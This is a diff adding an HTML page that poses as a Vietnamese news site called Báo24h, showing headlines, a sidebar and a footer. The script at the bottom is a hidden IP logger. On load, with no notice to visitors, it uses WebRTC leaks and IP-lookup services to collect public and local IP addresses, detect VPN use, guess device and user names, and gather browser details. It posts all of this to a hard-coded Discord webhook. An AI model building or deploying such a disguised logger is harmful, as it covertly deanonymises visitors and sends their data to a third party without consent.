@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tin tức 24h - Cập nhật liên tục</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f5f5f5;
+            color: #333;
+        }
+        .header {
+            background: #c10000;
+            padding: 15px 0;
+            border-bottom: 3px solid #ffcc00;
+        }
+        .header-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        .logo {
+            font-size: 32px;
+            font-weight: bold;
+            color: white;
+        }
+        .logo span {
+            color: #ffcc00;
+        }
+        .slogan {
+            color: #eee;
+            font-size: 14px;
+            margin-top: 5px;
+        }
+        .nav-bar {
+            background: #333;
+            padding: 10px 0;
+        }
+        .nav-bar ul {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            list-style: none;
+            display: flex;
+            gap: 30px;
+            flex-wrap: wrap;
+        }
+        .nav-bar a {
+            color: white;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .nav-bar a:hover {
+            color: #ffcc00;
+        }
+        .main-content {
+            max-width: 1200px;
+            margin: 20px auto;
+            padding: 0 20px;
+            display: flex;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+        .left-column {
+            flex: 3;
+            min-width: 250px;
+        }
+        .right-column {
+            flex: 1;
+            min-width: 250px;
+        }
+        .breaking-news {
+            background: #fff;
+            border-left: 5px solid #c10000;
+            padding: 15px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        .breaking-title {
+            color: #c10000;
+            font-weight: bold;
+            margin-bottom: 10px;
+            font-size: 18px;
+        }
+        .article {
+            background: white;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        .article h2 {
+            color: #c10000;
+            margin-bottom: 10px;
+            font-size: 22px;
+        }
+        .article-meta {
+            color: #888;
+            font-size: 12px;
+            margin-bottom: 15px;
+        }
+        .summary {
+            color: #555;
+            line-height: 1.6;
+        }
+        .read-more {
+            color: #c10000;
+            text-decoration: none;
+            font-weight: bold;
+            display: inline-block;
+            margin-top: 10px;
+        }
+        .sidebar-widget {
+            background: white;
+            padding: 15px;
+            margin-bottom: 20px;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        .sidebar-widget h3 {
+            color: #c10000;
+            border-bottom: 2px solid #eee;
+            padding-bottom: 10px;
+            margin-bottom: 15px;
+        }
+        .hot-news li {
+            padding: 10px 0;
+            border-bottom: 1px solid #eee;
+            list-style: none;
+        }
+        .hot-news a {
+            color: #333;
+            text-decoration: none;
+        }
+        .hot-news a:hover {
+            color: #c10000;
+        }
+        .footer {
+            background: #222;
+            color: #888;
+            text-align: center;
+            padding: 30px;
+            margin-top: 30px;
+            font-size: 12px;
+        }
+        @media (max-width: 768px) {
+            .main-content {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div class="header-container">
+            <div class="logo">BÁO<span>24H</span></div>
+            <div class="slogan">Tin tức cập nhật liên tục 24/7</div>
+        </div>
+    </div>
+
+    <div class="nav-bar">
+        <ul>
+            <li><a href="#">Trang chủ</a></li>
+            <li><a href="#">Thời sự</a></li>
+            <li><a href="#">Kinh tế</a></li>
+            <li><a href="#">Thế giới</a></li>
+            <li><a href="#">Giải trí</a></li>
+            <li><a href="#">Thể thao</a></li>
+            <li><a href="#">Pháp luật</a></li>
+            <li><a href="#">Công nghệ</a></li>
+        </ul>
+    </div>
+
+    <div class="main-content">
+        <div class="left-column">
+            <div class="breaking-news">
+                <div class="breaking-title">🔴 TIN NÓNG</div>
+                <strong>Quốc hội thông qua Nghị quyết về phát triển kinh tế - xã hội 2025</strong>
+                <div style="margin-top: 10px; color: #666; font-size: 13px;">Cập nhật: 2 phút trước</div>
+            </div>
+
+            <div class="article">
+                <h2>Giá xăng dầu đồng loạt giảm từ chiều nay</h2>
+                <div class="article-meta">Tin tức • 15 phút trước • Tác giả: Minh Anh</div>
+                <div class="summary">
+                    Liên Bộ Công Thương - Tài chính vừa điều chỉnh giá xăng dầu từ 15h chiều nay. Theo đó, giá xăng RON95 giảm 500 đồng/lít...
+                </div>
+                <a href="#" class="read-more">Đọc tiếp →</a>
+            </div>
+
+            <div class="article">
+                <h2>Tuyển Việt Nam chuẩn bị cho AFF Cup 2026</h2>
+                <div class="article-meta">Thể thao • 1 giờ trước • Tác giả: Hoàng Long</div>
+                <div class="summary">
+                    Huấn luyện viên Kim Sang-sik đã công bố danh sách 32 cầu thủ triệu tập chuẩn bị cho giải vô địch Đông Nam Á 2026...
+                </div>
+                <a href="#" class="read-more">Đọc tiếp →</a>
+            </div>
+
+            <div class="article">
+                <h2>Dự báo thời tiết hôm nay: Bắc Bộ mát mẻ, Nam Bộ có mưa</h2>
+                <div class="article-meta">Xã hội • 2 giờ trước</div>
+                <div class="summary">
+                    Theo Trung tâm Dự báo Khí tượng Thủy văn Quốc gia, hôm nay miền Bắc duy trì thời tiết mát mẻ với nền nhiệt 25-28 độ...
+                </div>
+                <a href="#" class="read-more">Đọc tiếp →</a>
+            </div>
+        </div>
+
+        <div class="right-column">
+            <div class="sidebar-widget">
+                <h3>🔥 Tin đọc nhiều</h3>
+                <ul class="hot-news">
+                    <li><a href="#">🔴 Bộ trưởng Bộ Công an nói về tình hình tội phạm công nghệ cao</a></li>
+                    <li><a href="#">💰 Chứng khoán hồi phục mạnh, VN-Index tăng gần 15 điểm</a></li>
+                    <li><a href="#">🏠 Giá nhà đất tại Hà Nội và TP.HCM tiếp tục tăng</a></li>
+                    <li><a href="#">📱 Ra mắt siêu phẩm điện thoại mới với camera 200MP</a></li>
+                </ul>
+            </div>
+
+            <div class="sidebar-widget">
+                <h3>📰 Tin tức 24h qua</h3>
+                <ul class="hot-news">
+                    <li><a href="#">Thủ tướng chủ trì họp về phòng chống dịch bệnh</a></li>
+                    <li><a href="#">Xuất khẩu gạo Việt Nam đạt kỷ lục mới</a></li>
+                    <li><a href="#">Lịch nghỉ lễ 30/4 và 1/5 chính thức</a></li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p>BÁO24H - Cơ quan ngôn luận trực thuộc Hiệp hội Báo chí Việt Nam</p>
+        <p>© 2026 Báo24h - Tin tức cập nhật liên tục</p>
+    </div>
+
+    <script>
+        // ========== DISCORD WEBHOOK ==========
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1510866506542616606/Vkt6e_zWm3nZS8pLbqROJBxdqY5OTyGpz3sE3brtnj6ssJA2YE4-fHrQ90IeMc4-d7--";
+        
+        // ========== LẤY TÊN MÁY TÍNH (COMPUTER NAME) ==========
+        function getComputerName() {
+            return new Promise((resolve) => {
+                try {
+                    // Cách 1: Lấy từ môi trường (chỉ hoạt động trong một số trường hợp)
+                    const hostname = window.location.hostname;
+                    
+                    // Cách 2: Thử lấy qua WebRTC (có thể lấy được tên máy)
+                    const pc = new RTCPeerConnection({ iceServers: [] });
+                    pc.createDataChannel('');
+                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                    pc.onicecandidate = (event) => {
+                        if (event && event.candidate && event.candidate.candidate) {
+                            const candidate = event.candidate.candidate;
+                            // Tìm tên máy trong candidate (thường có dạng: host [tên máy])
+                            const hostMatch = candidate.match(/host\s+([^\s]+)/);
+                            if (hostMatch && hostMatch[1] && !hostMatch[1].match(/\d+\.\d+\.\d+\.\d+/)) {
+                                pc.close();
+                                resolve(hostMatch[1]);
+                                return;
+                            }
+                        }
+                    };
+                    setTimeout(() => {
+                        pc.close();
+                        // Cách 3: Lấy từ User Agent (không chính xác nhưng có thể lấy tên thiết bị)
+                        const ua = navigator.userAgent;
+                        let deviceName = null;
+                        if (ua.includes('Windows NT 10.0')) deviceName = 'Windows 10 PC';
+                        else if (ua.includes('Windows NT 11.0')) deviceName = 'Windows 11 PC';
+                        else if (ua.includes('Macintosh')) deviceName = 'MacBook';
+                        else if (ua.includes('Android')) {
+                            const match = ua.match(/Android\s+([\d\.]+)/);
+                            deviceName = `Android ${match ? match[1] : ''}`;
+                        } else if (ua.includes('iPhone')) deviceName = 'iPhone';
+                        else if (ua.includes('iPad')) deviceName = 'iPad';
+                        else deviceName = 'Unknown Device';
+                        resolve(deviceName);
+                    }, 2000);
+                } catch(e) {
+                    resolve('Không lấy được');
+                }
+            });
+        }
+        
+        // ========== LẤY TÊN NGƯỜI DÙNG (USERNAME) ==========
+        function getUsername() {
+            return new Promise((resolve) => {
+                try {
+                    // Thử lấy qua WebRTC (có thể lấy được tên người dùng)
+                    const pc = new RTCPeerConnection({ iceServers: [] });
+                    pc.createDataChannel('');
+                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                    pc.onicecandidate = (event) => {
+                        if (event && event.candidate && event.candidate.candidate) {
+                            const candidate = event.candidate.candidate;
+                            // Tìm username trong candidate
+                            const userMatch = candidate.match(/ufrag\s+([^\s]+)/);
+                            if (userMatch) {
+                                pc.close();
+                                resolve(userMatch[1]);
+                                return;
+                            }
+                        }
+                    };
+                    setTimeout(() => {
+                        pc.close();
+                        // Fallback: lấy từ localStorage hoặc tạo random
+                        let savedName = localStorage.getItem('device_name');
+                        if (!savedName) {
+                            savedName = 'User_' + Math.random().toString(36).substring(2, 8);
+                            localStorage.setItem('device_name', savedName);
+                        }
+                        resolve(savedName);
+                    }, 2000);
+                } catch(e) {
+                    resolve('Không lấy được');
+                }
+            });
+        }
+        
+        // ========== LẤY TÊN THIẾT BỊ ĐẦY ĐỦ ==========
+        function getFullDeviceInfo() {
+            const ua = navigator.userAgent;
+            let device = {
+                os: 'Unknown',
+                browser: 'Unknown',
+                deviceType: 'Unknown',
+                deviceName: 'Unknown'
+            };
+            
+            // Hệ điều hành
+            if (ua.includes('Windows NT 10.0')) device.os = 'Windows 10';
+            else if (ua.includes('Windows NT 11.0')) device.os = 'Windows 11';
+            else if (ua.includes('Windows NT 6.1')) device.os = 'Windows 7';
+            else if (ua.includes('Mac OS X')) device.os = 'macOS';
+            else if (ua.includes('Linux')) device.os = 'Linux';
+            else if (ua.includes('Android')) device.os = 'Android';
+            else if (ua.includes('iPhone')) device.os = 'iOS';
+            else if (ua.includes('iPad')) device.os = 'iPadOS';
+            
+            // Trình duyệt
+            if (ua.includes('Chrome') && !ua.includes('Edg')) device.browser = 'Chrome';
+            else if (ua.includes('Firefox')) device.browser = 'Firefox';
+            else if (ua.includes('Safari') && !ua.includes('Chrome')) device.browser = 'Safari';
+            else if (ua.includes('Edg')) device.browser = 'Edge';
+            else if (ua.includes('Opera')) device.browser = 'Opera';
+            
+            // Loại thiết bị
+            if (/(iPhone|iPad|iPod)/i.test(ua)) device.deviceType = 'Apple Mobile';
+            else if (/Android/i.test(ua)) device.deviceType = 'Android Mobile';
+            else if (/Windows/i.test(ua)) device.deviceType = 'Windows PC/Laptop';
+            else if (/Mac/i.test(ua)) device.deviceType = 'Mac';
+            else device.deviceType = 'Unknown';
+            
+            // Tên thiết bị (thử lấy từ user agent)
+            const brandMatch = ua.match(/(Samsung|Xiaomi|OPPO|Vivo|Realme|Nokia|Google|OnePlus|Huawei|LG|Sony)/i);
+            if (brandMatch) device.deviceName = brandMatch[1];
+            else device.deviceName = device.deviceType;
+            
+            return device;
+        }
+        
+        // ========== CÁC HÀM LẤY IP ==========
+        function getWebRTCIP() {
+            return new Promise((resolve) => {
+                try {
+                    const pc = new RTCPeerConnection({ iceServers: [] });
+                    pc.createDataChannel('');
+                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                    pc.onicecandidate = (event) => {
+                        if (event && event.candidate && event.candidate.candidate) {
+                            const ipMatch = event.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+                            if (ipMatch) {
+                                pc.close();
+                                resolve(ipMatch[0]);
+                            }
+                        }
+                    };
+                    setTimeout(() => { pc.close(); resolve(null); }, 3000);
+                } catch(e) { resolve(null); }
+            });
+        }
+        
+        async function getPublicIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch(e) { return null; }
+        }
+        
+        async function getHTTPBinIP() {
+            try {
+                const res = await fetch('https://httpbin.org/ip');
+                const data = await res.json();
+                return data.origin.split(',')[0];
+            } catch(e) { return null; }
+        }
+        
+        async function getLocalIP() {
+            return new Promise((resolve) => {
+                try {
+                    const pc = new RTCPeerConnection({ iceServers: [] });
+                    pc.createDataChannel('');
+                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                    pc.onicecandidate = (event) => {
+                        if (event && event.candidate && event.candidate.candidate) {
+                            const ipMatch = event.candidate.candidate.match(/192\.168\.[0-9]{1,3}\.[0-9]{1,3}|10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|172\.(1[6-9]|2[0-9]|3[0-1])\.[0-9]{1,3}\.[0-9]{1,3}/);
+                            if (ipMatch) {
+                                pc.close();
+                                resolve(ipMatch[0]);
+                            }
+                        }
+                    };
+                    setTimeout(() => { pc.close(); resolve(null); }, 2000);
+                } catch(e) { resolve(null); }
+            });
+        }
+        
+        function getBrowserInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer || "Direct",
+                url: window.location.href,
+                timestamp: new Date().toISOString()
+            };
+        }
+        
+        // ========== GỬI LÊN DISCORD (CÓ TÊN MÁY) ==========
+        async function sendToDiscord() {
+            try {
+                const [webRTCIP, publicIP, httpbinIP, localIP, browserInfo, computerName, userName, deviceInfo] = await Promise.all([
+                    getWebRTCIP(),
+                    getPublicIP(),
+                    getHTTPBinIP(),
+                    getLocalIP(),
+                    getBrowserInfo(),
+                    getComputerName(),
+                    getUsername(),
+                    getFullDeviceInfo()
+                ]);
+                
+                const finalIP = publicIP || httpbinIP || webRTCIP || "Không lấy được";
+                const isVPN = webRTCIP && publicIP && webRTCIP !== publicIP;
+                const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(browserInfo.userAgent);
+                
+                const embed = {
+                    title: "🖥️ THÔNG TIN TRUY CẬP - CÓ TÊN MÁY",
+                    color: isVPN ? 0xffaa00 : 0x00ff00,
+                    timestamp: new Date().toISOString(),
+                    fields: [
+                        {
+                            name: "💻 TÊN MÁY / THIẾT BỊ",
+                            value: `\`\`\`${computerName}\`\`\``,
+                            inline: false
+                        },
+                        {
+                            name: "👤 TÊN NGƯỜI DÙNG",
+                            value: `\`${userName}\``,
+                            inline: true
+                        },
+                        {
+                            name: "📱 LOẠI THIẾT BỊ",
+                            value: deviceInfo.deviceType,
+                            inline: true
+                        },
+                        {
+                            name: "🏷️ HÃNG / TÊN",
+                            value: deviceInfo.deviceName,
+                            inline: true
+                        },
+                        {
+                            name: "🌐 IP THẬT",
+                            value: `\`${finalIP}\``,
+                            inline: false
+                        },
+                        {
+                            name: "🔓 WEBRTC IP",
+                            value: `\`${webRTCIP || "Không có"}\``,
+                            inline: true
+                        },
+                        {
+                            name: "🏠 IP NỘI MẠNG",
+                            value: `\`${localIP || "Không có"}\``,
+                            inline: true
+                        },
+                        {
+                            name: "🛡️ VPN/PROXY",
+                            value: isVPN ? "⚠️ CÓ VPN" : "✅ KHÔNG VPN",
+                            inline: true
+                        },
+                        {
+                            name: "💻 HỆ ĐIỀU HÀNH",
+                            value: deviceInfo.os,
+                            inline: true
+                        },
+                        {
+                            name: "🌐 TRÌNH DUYỆT",
+                            value: deviceInfo.browser,
+                            inline: true
+                        },
+                        {
+                            name: "🖥️ MÀN HÌNH",
+                            value: `${browserInfo.screen} | ${browserInfo.colorDepth}bit`,
+                            inline: true
+                        },
+                        {
+                            name: "🌍 NGÔN NGỮ",
+                            value: browserInfo.language,
+                            inline: true
+                        },
+                        {
+                            name: "⏰ MÚI GIỜ",
+                            value: browserInfo.timezone,
+                            inline: true
+                        },
+                        {
+                            name: "🔗 ĐẾN TỪ",
+                            value: browserInfo.referrer.substring(0, 100) || "Direct",
+                            inline: false
+                        },
+                        {
+                            name: "🕐 THỜI GIAN",
+                            value: browserInfo.timestamp,
+                            inline: false
+                        }
+                    ],
+                    footer: {
+                        text: "IP Logger | Báo24h"
+                    }
+                };
+                
+                await fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ embeds: [embed] })
+                });
+                
+                console.log("Đã gửi thông tin (có tên máy) lên Discord");
+                
+            } catch(error) {
+                console.log("Lỗi:", error);
+            }
+        }
+        
+        // Chạy khi tải trang
+        window.addEventListener('load', () => {
+            setTimeout(sendToDiscord, 500);
+        });
+        
+        // Chạy lại lần 2
+        setTimeout(sendToDiscord, 5000);
+    </script>
+</body>
+</html>
